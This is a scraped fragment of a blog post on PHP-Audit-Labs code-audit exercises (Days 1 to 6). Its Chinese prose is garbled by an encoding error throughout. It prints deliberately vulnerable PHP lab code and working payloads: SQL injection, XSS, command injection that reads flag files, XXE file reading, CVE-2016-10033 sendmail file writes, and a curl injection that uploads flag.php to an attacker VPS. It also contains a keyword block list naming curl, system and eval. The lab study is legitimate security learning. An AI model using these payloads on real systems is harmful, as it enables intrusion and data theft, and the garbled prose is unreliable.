/","link":"","permalink":"https://www.bycsec.top/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/","excerpt":"æ‰“ç®—åœ¨ä»£ç å®¡è®¡ä¸Šå…¥ä¸‹å‘ã€‚æœ¬æ¥æ‰¾äº†ä¸ªä¸çŸ¥åcmsæƒ³å®¡è®¡ä¸€ä¸‹çš„ã€‚å¶ç„¶é—´çœ‹åˆ°äº†æ˜Ÿç›Ÿç‹å¹ä¹‹å¸ˆå‚…åœ¨ç”¨php-audit-labsç»ƒå®¡è®¡,æ‰€ä»¥è‡ªå·±ä¹Ÿæ‰“ç®—ç»ƒä¸€ä¸‹å®¡è®¡çš„æŠ€æœ¯,æ¯•ç«Ÿè‡ªå·±å®¡è®¡åŠŸåŠ›å¤ªå·®äº†â€¦pç‰›ä¹Ÿæ›¾ç»è¯´è¿‡,ç»ƒä¹ å®¡è®¡åˆ°èƒ½çœ‹æ‡‚ä¸€ä¸ªå®Œæ•´çš„CMSå°±ç®—æœ‰ä¸€å®šåŠŸåº•äº†ã€‚æ‰€ä»¥å°±æŠŠphp-audit-labsçš„å…¨éƒ¨éƒ½è¿‡ä¸€éå§ã€‚ (æœ€è¿‘ä¹Ÿæ€»ç®—ç†Ÿç»ƒäº†ä¸€ä¸‹nodeè·Ÿpythonç›¸å…³çš„å¼€å‘å…¥é—¨ã€‚ç­‰ä¹‹åæ‰¾æ—¶é—´æŠŠjavaå…¥é—¨çŸ¥è¯†è¿‡ä¸€é,å†æŠŠECMAscript6çš„åŸºç¡€è¿‡ä¸€éå°±å·®ä¸å¤šäº†ï¼‰","text":"æ‰“ç®—åœ¨ä»£ç å®¡è®¡ä¸Šå…¥ä¸‹å‘ã€‚æœ¬æ¥æ‰¾äº†ä¸ªä¸çŸ¥åcmsæƒ³å®¡è®¡ä¸€ä¸‹çš„ã€‚å¶ç„¶é—´çœ‹åˆ°äº†æ˜Ÿç›Ÿç‹å¹ä¹‹å¸ˆå‚…åœ¨ç”¨php-audit-labsç»ƒå®¡è®¡,æ‰€ä»¥è‡ªå·±ä¹Ÿæ‰“ç®—ç»ƒä¸€ä¸‹å®¡è®¡çš„æŠ€æœ¯,æ¯•ç«Ÿè‡ªå·±å®¡è®¡åŠŸåŠ›å¤ªå·®äº†â€¦pç‰›ä¹Ÿæ›¾ç»è¯´è¿‡,ç»ƒä¹ å®¡è®¡åˆ°èƒ½çœ‹æ‡‚ä¸€ä¸ªå®Œæ•´çš„CMSå°±ç®—æœ‰ä¸€å®šåŠŸåº•äº†ã€‚æ‰€ä»¥å°±æŠŠphp-audit-labsçš„å…¨éƒ¨éƒ½è¿‡ä¸€éå§ã€‚ (æœ€è¿‘ä¹Ÿæ€»ç®—ç†Ÿç»ƒäº†ä¸€ä¸‹nodeè·Ÿpythonç›¸å…³çš„å¼€å‘å…¥é—¨ã€‚ç­‰ä¹‹åæ‰¾æ—¶é—´æŠŠjavaå…¥é—¨çŸ¥è¯†è¿‡ä¸€é,å†æŠŠECMAscript6çš„åŸºç¡€è¿‡ä¸€éå°±å·®ä¸å¤šäº†ï¼‰ Day1in_array()ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ä¸»è¦é—®é¢˜åœ¨äºin_array()å‡½æ•°çš„ä½¿ç”¨ä¸å½“ã€‚å¦‚æœæœªè®¾ç½®in_array()ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºtrueåˆ™æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ 7shell.phpç»•è¿‡æ£€æŸ¥ã€‚å› ä¸º7shell.phpè¢«è½¬æ¢ä¸º7.åŒæ ·å‡ºç°åœ¨æŸcmsä¸­åˆ©ç”¨è¿™ç‚¹å¯ä»¥ç»•è¿‡è¿›è¡Œinsert_intoæ³¨å…¥å½“in_array()ç»•è¿‡åè½»æ¾è¾¾æˆæ³¨å…¥ã€‚1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));# ç»ƒä¹ config.php 12345678910111213141516&lt;?php $servername = \"localhost\";$username = \"root\";$password = \"root\";$dbname = \"day1\";function stop_hack($value)&#123; $pattern = \"insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval\"; $back_list = explode(\"|\",$pattern); foreach($back_list as $hack)&#123; if(preg_match(\"/$hack/i\", $value)) die(\"$hack detected!\"); &#125; return $value;&#125;?&gt; index.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpinclude 'config.php';$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) &#123; die(\"è¿æ¥å¤±è´¥: \");&#125;$sql = \"SELECT COUNT(*) FROM users\";$whitelist = array();$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row['COUNT(*)']);&#125;$id = stop_hack($_GET['id']);$sql = \"SELECT * FROM users WHERE id=$id\";if (!in_array($id, $whitelist)) &#123; die(\"id $id is not in whitelist.\");&#125;$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo \"&lt;center&gt;&lt;table border='1'&gt;\"; foreach ($row as $key =&gt; $value) &#123; echo \"&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;\"; echo \"&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;\"; &#125; echo \"&lt;/table&gt;&lt;/center&gt;\";&#125;else&#123; die($conn-&gt;error);&#125;?&gt; è¿™é¢˜çš„in_array()å¹¶ä¸æ˜¯éš¾ç‚¹ã€‚å› ä¸ºåªè¦idå¼€å¤´ä¸ºæ•°å­—å°±èƒ½ç»•è¿‡äº†ä¸»è¦é—®é¢˜åœ¨äºåé¢æ³¨å…¥ä¸Šã€‚æ‰€å¹¸è¯­å¥ä¸­ä¼šçˆ†å‡ºsqlerror.åœ¨è¿‡æ»¤äº†è¿™äº›å…³é”®å­—çš„æƒ…å†µä¸‹ä»å¯ä»¥ä½¿ç”¨æŠ¥é”™å‡½æ•°,select,fromç­‰åŸºæœ¬å°±è¶³å¤Ÿå¾—åˆ°flagäº†ã€‚ä¸è¿‡è¿™é‡Œå­˜åœ¨ä¸€ä¸ªç»†èŠ‚,å°±æ˜¯updatexmlè¿™æ ·çš„æŠ¥é”™å‡½æ•°å¦‚æœè¯­å¥ä¸­ä¸åŒ…å«ç‰¹æ®Šå­—ç¬¦ä¹Ÿå°±æ˜¯æˆ‘ä»¬åŸæ¥ç»å¸¸ä½¿ç”¨çš„0x7eä¹‹ç±»çš„å­—ç¬¦ï¼Œçˆ†å‡ºçš„ç»“æœå°†ä¼šå‡ºç°å­—ç¬¦ä¸¢å¤±çš„ç°è±¡ã€‚ æ‰€ä»¥æ‰¾æ›¿ä»£çš„å­—ç¬¦ä¸²è¿æ¥å‡½æ•°å³å¯.make_set() 1?id&#x3D;4 and (select updatexml(1,make_set(3,&#39;~&#39;,(select flag from flag)),1)) å…¶å®è‡ªå·±åŸæ¥åšsqlæ³¨å…¥çš„é¢˜ç›®ä¹Ÿæ›¾æœç´¢è¿‡ç›¸å…³çš„å†…å®¹ã€‚æ¯”å¦‚åœ¨concatè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ä¸ä½¿ç”¨group_concatå°†æ‰€æœ‰æŸ¥è¯¢ç»“æœéƒ½åˆ—å‡ºæ¥ã€‚å½“æ—¶å‘ç°make_set()æ˜¯èƒ½èµ·åˆ°concatä¸€æ ·çš„æ•ˆæœçš„ã€‚ä½†æ˜¯æ³¨æ„çš„æ˜¯,make_setè‡³å°‘æ¥æ”¶ä¸¤ä¸ªå‚æ•°,å› æ­¤å¿…é¡»ä½¿ç”¨é€—å·ã€‚concatç±»åˆ™ä¸ç„¶ã€‚ Day2filter_var() é¢˜ç›®ä¸»è¦æ˜¯åœ¨ä¸¤å¤„å­˜åœ¨è¿‡æ»¤ã€‚é¦–å…ˆæ˜¯twigæ¨¡æ¿é‡Œå‡ºç°çš„linkè¢«escapeäº† ç„¶åæ˜¯ä¸€ä¸ªfilter_var()å‡½æ•°è¿™é‡Œescapeè¿‡æ»¤å™¨è°ƒç”¨çš„å®é™…ä¸Šæ˜¯htmlspecialchars()å‡½æ•°ã€‚ä½œç”¨è‡ªç„¶æ˜¯å°†å¸¸è§çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¸ºå®ä½“å­—ç¬¦ã€‚è€Œfilter_var()åœ¨curlçš„ssrfä¸­å°±æ›¾è§è¿‡ã€‚ä¸»è¦æ£€æŸ¥ä¸€ä¸ªurlæ˜¯å¦åˆæ³•ã€‚å› æ­¤ä»£ç é€»è¾‘ä¸»è¦æ˜¯ç»è¿‡è¿‡æ»¤åç”Ÿæˆä¸€ä¸ªaæ ‡ç­¾ã€‚é‚£ä¹ˆå¯èƒ½å­˜åœ¨self-xss å®˜æ–¹çš„payload?nextSlide=javascript://commentï¼…250aalert(1)è¾¾åˆ°å¼¹çª—çš„self-xss. ä½¿ç”¨javascriptä¼ªåè®®ç»•è¿‡å·§å¦™çš„å°±æ˜¯åˆ©ç”¨filtervarçš„ç¼ºé™·è½»æ¾ä½¿ç”¨xxx://çš„å½¢å¼ç»•è¿‡æ£€æŸ¥ã€‚ç„¶åä¹Ÿå¯ä»¥è¿›è¡Œjsè¯­å¥çš„æ‰§è¡Œã€‚é‡è¦çš„ä¸€ç‚¹å°±æ˜¯//åœ¨jsä¸­æ˜¯æ³¨é‡Šç¬¦ã€‚å› æ­¤ä½¿ç”¨%250a(double urlencode %0a ä»¥ç»•è¿‡æµè§ˆå™¨è‡ªåŠ¨çš„è§£ç )å°†åé¢çš„å†…å®¹æ¢è¡Œåˆ°ä¸‹ä¸€è¡Œã€‚æˆåŠŸæ‰§è¡Œalert. æŸcmsä¸­çš„åˆ©ç”¨æ˜¯,åœ¨è®¿é—®404é¡µé¢å­˜åœ¨è¿™æ ·çš„ä»£ç  1&lt;code&gt;&lt;?php echo current_url(); ?&gt;&lt;/code&gt; current_url()æ–¹æ³•æ¥å—å®Œæ•´çš„404urlå‚æ•°ã€‚è¿”å›æœ€åä¸€ä¸ª/åçš„å†…å®¹æ‹¼æ¥è¿›codeä»£ç å—ã€‚å³å¯ä»¥æ’å…¥xssä»£ç &lt;script&gt;alert(1)&lt;/script&gt;å¯¼è‡´äº†xsspayloadhttp://localhost/anchor/index.php/&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt; ç»ƒä¹ 12345678910111213141516171819202122// index.php&lt;?php $url = $_GET['url'];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match('/sec-redclub.com$/',$site_info['host']))&#123; exec('curl \"'.$site_info['host'].'\"', $result); echo \"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;\"; echo implode(' ', $result); &#125; else&#123; die(\"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;\"); &#125;&#125;else&#123; echo \"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;\";&#125;?&gt; 1234// f1agi3hEre.php&lt;?php $flag = \"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;\"?&gt; ä¸€ä¸ªæ˜æ˜¾çš„curlã€‚è€Œä¸”è¿˜æ˜¯ç»å…¸çš„å¯ç»•è¿‡çš„filter_var()+parse_url()+exec()æ‰§è¡Œcurlçš„é…ç½®ã€‚é‚£ç°åœ¨å…³é”®æ˜¯åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚æ¯”å¦‚æŠŠä¹‹å‰çš„å¯ç»•è¿‡filter_var()+parse_url()çš„payloadæ‹¿å‡ºæ¥ 12demo:&#x2F;&#x2F;evil.com:80;sec-redclub.com:80&#x2F;demo:&#x2F;&#x2F;evil.com:80,sec-redclub.com:80&#x2F; è¿™é‡Œæƒ³è¦æ‰§è¡Œå‘½ä»¤è¯»å–æ–‡ä»¶ã€‚é‚£ä¹ˆæ°å¥½å¯ä»¥ç”¨åˆ°linuxä¸­ä½¿ç”¨åˆ†å·è¿›è¡Œå‘½ä»¤åˆ†å‰²çš„ä½œç”¨ã€‚demo://%22;ls;%23;sec-redclub.com:80/ç„¶åä¸ºäº†è¯»æ–‡ä»¶ä½¿ç”¨&lt;ä»£æ›¿ç©ºæ ¼demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/ å•çº¯é’ˆå¯¹filter_varçš„è¯æŠŠä¸ƒæœˆç«å¸ˆå‚…çš„payloadæ”¾å‡ºæ¥ 12345678http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.comPS:æœ€åä¸€ä¸ªpayloadçš„#ç¬¦å·ï¼Œè¯·æ¢æˆå¯¹åº”çš„urlç¼–ç  %23 Day3class_exists()&amp;&amp;å†…éƒ¨ç±»xxe ä¸Šé¢çš„ä»£ç æœ‰ä¸€ä¸ªæ¯”è¾ƒè¿‡æ—¶çš„è·¯å¾„ç©¿è¶Šçš„æ–‡ä»¶åŒ…å«çš„æ´ã€‚å³è°ƒç”¨class_exists()å‡½æ•°æ—¶ä¼šè‡ªåŠ¨åŠ è½½__autoload()ã€‚è¾¾æˆæ–‡ä»¶åŒ…å«ã€‚å¦‚æœæ˜¯ph5-5.3åˆ™å¯ä»¥æ„é€ è·¯å¾„ç©¿è¶Šã€‚è¿˜æœ‰ä¸€ä¸ªæ´æ¯”è¾ƒæœ‰æ„æ€ã€‚å®ä¾‹åŒ–ç±»çš„ç±»åå’Œä¼ å…¥ç±»çš„å‚æ•°å‡å¯æ§ã€‚æ­¤æ—¶å³ä½¿æ²¡æœ‰æ¶æ„ç±»æˆ‘ä»¬ä¹Ÿèƒ½ç”¨SimpleXMLElementæ„é€ xxeæ”»å‡»ã€‚è¿™ç‚¹æˆ‘åœ¨buuä¸ŠåšSUCTF 2018 Homeworkè¿™é¢˜æ—¶ä¹Ÿç”¨åˆ°äº†å®ƒè¾¾æˆxxeå¹¶è¿›ä¸€æ­¥ä½¿ç”¨xxeæ‰“ssrf æŸcmsçš„åˆ©ç”¨æ˜¯ä¸€ä¸ªå¯æ§å˜é‡å¸¦æ¥çš„ååºåˆ—åŒ–XXE.å…·ä½“åˆ©ç”¨ä¸è°ˆã€‚ç®€å•è¯´ä¸‹gadgetæœ€åçš„åˆ©ç”¨ã€‚ç±»ä¸­å®ç°äº†ä¸€ä¸ªåå°„ç±»å®ä¾‹åŒ–ã€‚è€Œç±»åå¯æ§ã€‚ä¹‹åè¿åå°„ç±»çš„å‚æ•°ä¹Ÿæ˜¯å¯æ§çš„ã€‚å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä»»æ„å®ä¾‹åŒ–SimpleXMLElementå¹¶æ„é€ xxepayloadè¿›è¡Œæ”»å‡»ã€‚æ ¹æ®å®é™…æƒ…å†µæ„é€ payload{&quot;Shopware\\\\Bundle\\\\SearchBundle\\\\Sorting\\\\PriceSorting&quot;:{&quot;direction&quot;:&quot;asc&quot;}}è¿™é‡Œå‡ ä¸ªå‚æ•°å°¤å…¶æ˜¯2é‚£ä¸ªå°è±¡å¾ˆæ·±åˆ»,åŒæ—¶ä¹Ÿå¾ˆå¿…è¦ã€‚SUCTFé‚£é¢˜å°±æ˜¯å¦‚æ­¤{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}} ç»ƒä¹ 12345678910111213141516171819202122// index.php&lt;?phpclass NotFound&#123; function __construct() &#123; die('404'); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.'=&gt;'.$value.'&lt;br&gt;';&#125; 1234// f1agi3hEre.php&lt;?php$flag = \"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;\";?&gt; åˆ©ç”¨ç»è¿‡ä¸Šé¢çš„é“ºå«å°±å¾ˆç®€å•äº†ã€‚ç›´æ¥ç”¨å¯æ§çš„å‚æ•°è¿›è¡Œxxeå³å¯ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯,xxeéœ€è¦è¿›è¡Œphpæ–‡ä»¶æµæ¥è¿›è¡Œå†…å®¹è¯»å–ã€‚å› ä¸º&lt; &gt; &amp; &#39; &quot;ç­‰å­—ç¬¦ä¼šä½¿xmlè§£æå‡ºé”™ã€‚ä¸è¿‡ç”¨base64è¯»æ–‡ä»¶è¿™ç§è§£å†³åŠæ³•æƒ³å¿…æ—©å°±æ˜¯è½»è½¦ç†Ÿè·¯äº†å§ã€‚?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2 å‡å¦‚é¢˜ç›®ä¸çŸ¥é“flagçš„åå­—è¿˜å¯ä»¥ç”¨å¦å¤–çš„ç±»è¿›è¡Œæ–‡ä»¶åçš„è¯»å–ã€‚?name=GlobIterator&amp;param=./*.php&amp;param2=0ä½œç”¨ä¸globå·®ä¸å¤šã€‚ Day4str_pos()é”™è¯¯ä½¿ç”¨ phpè®¸å¤šå‡½æ•°å› ä¸ºå¼±ç±»å‹æˆ–é»‘é­”æ³•è¯ç”Ÿäº†å„ç§å„æ ·çš„æ¼æ´ã€‚str_pos()ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¸Šé¢çš„ä»£ç çœ‹ä¼¼ä¸¥æ ¼é™åˆ¶äº†å†…å®¹ä¸èƒ½å«æœ‰&lt;ä¸&gt;ã€‚ç„¶è€Œstr_posè¿”å›çš„å€¼å¯ä»¥æ˜¯0.å³åŒ¹é…çš„å­—ç¬¦ä¸²é¦–ä¸ªå­—ç¬¦å°±æ˜¯&lt;ï¼Œ&gt;ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œï¼strpos()è¿”å›çš„å°±æ˜¯çœŸå€¼ã€‚æˆåŠŸç»•è¿‡ã€‚payload:&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;åŒæ ·ç±»ä¼¼çš„æ¼æ´ä¹Ÿå¸¸è§äºpreg_match()è¿™æ ·çš„å‡½æ•°ã€‚å› ä¸ºå®ƒå¯èƒ½ä¼šå› ä¸ºä¼ å…¥æ•°ç»„æˆ–è€…æ­£åˆ™å›æº¯å¯¼è‡´è¿”å›falseå€¼ã€‚å¦‚æœå¼€å‘è€…æ‰€å†™çš„åˆ¤æ–­åªæ˜¯!preg_match()å°±å¾ˆå®¹æ˜“ç»•è¿‡äº†ã€‚ æŸCMSä¸­çš„é—®é¢˜ä¹Ÿæ˜¯å¼±ç±»å‹çš„é”…ã€‚ä½¿ç”¨è‹¥ç±»å‹ç›¸ç­‰åˆ¤æ–­æ—¶ï¼Œå‡å¦‚æ•°æ®åº“ä¸­å­˜å‚¨çš„å€¼æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆå½“nullä¸â€â€è¿›è¡Œå¼±ç±»å‹ç›¸ç­‰æ—¶å°†è¿”å›true. 1234null=='' //true\"0.0\"==\"0\" //true\"0.\"==\"0\" //true\"0e\"==\"0\" //true ç»ƒä¹ è¿™æ˜¯æ”»é˜²ä¸–ç•Œä¸Šåšè¿‡çš„åŸé¢˜ã€‚åº”è¯¥æ˜¯lotteryè¿™ä¸ªæŠŠã€‚ç”¨åˆ°çš„æ˜¯jsonçš„å¼±ç±»å‹ã€‚jsonå¼±ç±»å‹åˆ¤ç›¸ç­‰æ—¶ï¼Œåªè¦ä¼ å…¥trueä¸éé›¶æ•°å­—ã€‚ç»“æœéƒ½å°†è¿”å›true jsonå¼±ç±»å‹æ¯”è¾ƒå‡ºåçš„ä¸€ä¸ªæ¯”è¾ƒå°±æ˜¯æ•°å­—ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢ 1230&#x3D;&#x3D;&quot;0a....sds&quot;12&#x3D;&#x3D;&quot;12fw...sd&quot;789&#x3D;&#x3D;&quot;789asabxz&quot; å­—ç¬¦ä¸²ä¼šè¢«ç›´æ¥æˆªå–å‰é¢çš„çº¯æ•°å­—éƒ¨åˆ†è¿›è¡Œåˆ¤æ–­ Day5escapeshellcmd()+escapeshellarg() ä¸»ä½“ä¸Šå°±æ˜¯ä¸€ä¸ªè¿‡æ»¤äº†åçš„mailå‡½æ•°æ‰§è¡Œã€‚mailå‡½æ•°çš„å‚æ•°æ˜¯è¿™æ ·çš„ 1234567bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]]) ç”±äºé»˜è®¤è°ƒç”¨çš„æ˜¯linuxçš„sendmailå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥åœ¨messageä¸­å†™å…¥æ¶æ„ä»£ç ã€‚æ¥ç€ç”±additional_parameters æŒ‡å®šé¢å¤–å‚æ•°ï¼Œä»è€Œå†™å…¥åœ¨æŒ‡å®šç›®å½•å†™å…¥æ–‡ä»¶ã€‚ ä½†æ˜¯ï¼Œphpçš„mailå‡½æ•°ä¹Ÿåœ¨åº•å±‚é»˜è®¤æ‰§è¡Œäº†ä¸€å±‚escapeshellcmd()å‡½æ•°ï¼Œé‚£ä¹ˆæ˜¾ç„¶è½¬ä¹‰äº†æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚ä¸è¿‡ï¼Œæœ¬é¢˜ä»£ç è¿˜æœ‰ä¸€å¤„ç»å…¸çš„escapeshellarg()ã€‚å¦‚æœescapeshellarg()+escapeshellcmd()æ­é…ä½¿ç”¨ï¼Œå°†å‡ºç°ç‰¹æ®Šå­—ç¬¦é€ƒé€¸çš„é—®é¢˜ã€‚buuä¸Šä¹Ÿæœ‰ä¸€ä¸ªç±»ä¼¼çš„é¢˜ç›®.è¿™é‡Œåˆ™å€Ÿç”¨é¡¹ç›®é‡Œçš„ä¾‹å­ç®€å•ä»‹ç»ä¸‹ 12345127.0.0.1' -v -d a=1#escapeshellarg'127.0.0.1'\\'' -v -d a=1'#escapeshellcmd'127.0.0.1'\\\\'' -v -d a=1\\' æ­¤æ—¶æœ€åä¸€æ­¥å¯ä»¥çœ‹å‡ºï¼Œ\\\\å°†è¢«è§£é‡Šä¸º\\ä¸å†èµ·åˆ°è½¬ä¹‰çš„ä½œç”¨ï¼Œè€Œæ˜¯ä½œä¸ºæ¢è¡Œç¬¦ã€‚å› æ­¤payloadå˜ä¸ºå…ˆæ˜¯127.0.0.1ï¼Œå†-v -d-då¯¹åº”çš„æ•°æ®ä¸ºa=1&#39;. æ¯”å¦‚CVE-2016-10033 è·ŸCVE-2016-10045çš„ä¸¤ä¸ªpayload 123a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.coma&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com å‰è€…æ²¡æœ‰escapeshellcmdç›´æ¥æ‰“ã€‚åè€…escapeshellcmdååˆåŠ äº†ä¸€å±‚escapeshellargå¯¼è‡´å­—ç¬¦é€ƒé€¸ã€‚ ç»ƒä¹ 12345678910111213141516171819202122232425262728293031323334353637383940//index.php&lt;?phphighlight_file('index.php');function waf($a)&#123; foreach($a as $key =&gt; $value)&#123; if(preg_match('/flag/i',$key))&#123; exit('are you a hacker'); &#125; &#125;&#125;foreach(array('_POST', '_GET', '_COOKIE') as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET['flag']))&#123; if($_GET['flag'] === $_GET['hongri'])&#123; exit('error'); &#125; if(md5($_GET['flag'] ) == md5($_GET['hongri']))&#123; $url = $_GET['url']; $urlInfo = parse_url($url); if(!(\"http\" === strtolower($urlInfo[\"scheme\"]) || \"https\"===strtolower($urlInfo[\"scheme\"])))&#123; die( \"scheme error!\"); &#125; $url = escapeshellarg($url); $url = escapeshellcmd($url); system(\"curl \".$url); &#125;&#125;?&gt; 1234// flag.php&lt;?php$flag = \"HRCTF&#123;Are_y0u_maz1ng&#125;\";?&gt; å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–ï¼Œä¹‹åè¦ç»•è¿‡wafã€‚å†æ¥ä¸‹æ¥å°±æ˜¯escapeshellsmd/argçš„æ­é…è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚é¦–å…ˆè¦è§£å†³çš„æ˜¯ï¼Œæˆ‘ä»¬å¿…é¡»ç»•è¿‡preg_matchçš„é™åˆ¶æ‰èƒ½ä¼ å…¥flagå˜é‡ã€‚å› æ­¤è¦åˆ©ç”¨å¥½å®ƒå†™å¥½çš„è¿™ä¸ªåŠŸèƒ½ã€‚ é¦–å…ˆè¿™é‡Œåˆ©ç”¨äº†å¯å˜å˜é‡çš„ç‰¹æ€§ã€‚å‡è®¾æˆ‘ä»¬æäº¤ 12?flag&#x3D;test post:_GET[flag]&#x3D;test å½“å¼€å§‹éå† $_POST è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ $__k ä»£è¡¨ _GET[flag] ï¼Œæ‰€ä»¥ $$__kå°±æ˜¯ $_GET[flag] ï¼Œå³ test å€¼ï¼Œæ­¤æ—¶ $$__k == $__v æˆç«‹ï¼Œå˜é‡ $_GET[flag] å°±è¢« unset äº† è€Œæ¥ä¸‹æ¥ä¸‹é¢åˆæœ‰ä¸€ä¸ªå˜é‡è¦†ç›–if($_POST) extract($_POST, EXTR_SKIP);æ‰€ä»¥ç›´æ¥å¾—åˆ°$_GET[flag]=testç»•è¿‡ç¬¬ä¸€å±‚ ç¬¬äºŒå±‚åªéœ€åˆ©ç”¨0eçš„MD5å¼±ç±»å‹æ¯”è¾ƒæœ€åæ˜¯curlçš„å‘½ä»¤æ‰§è¡Œhttp://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999ä¼¼ä¹å½“curlç‰ˆæœ¬å˜é«˜åï¼Œå°†ä¸å†èƒ½æ‰§è¡Œã€‚curl &#39;127.0.0.1&#39;\\&#39;&#39; Day6æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ã€‚ä¸»è¦æ˜¯preg_replace()å‡½æ•°çš„ä½¿ç”¨ä¸å½“ã€‚å¿½ç•¥äº†../../è¿™ç§è·¯å¾„ã€‚å¯ä»¥ä½¿ç”¨è·¯å¾„ç©¿è¶Šè¿›è¡Œä»»æ„æ–‡ä»¶åˆ é™¤ ç»ƒä¹ 12345678910111213141516171819202122232425262728293031// index.php&lt;?phpinclude 'flag.php';if (\"POST\" == $_SERVER['REQUEST_METHOD'])&#123; $password = $_POST['password']; if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) &#123; echo 'Wrong Format'; exit; &#125; while (TRUE) &#123; $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); foreach ($ps as $pt) &#123; if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; &#125; if ($c &lt; 3) break; if (\"42\" == $password) echo $flag; else echo 'Wrong password'; exit; &#125;&#125;highlight_file(__FILE__);?&gt; ç»ƒä¹ 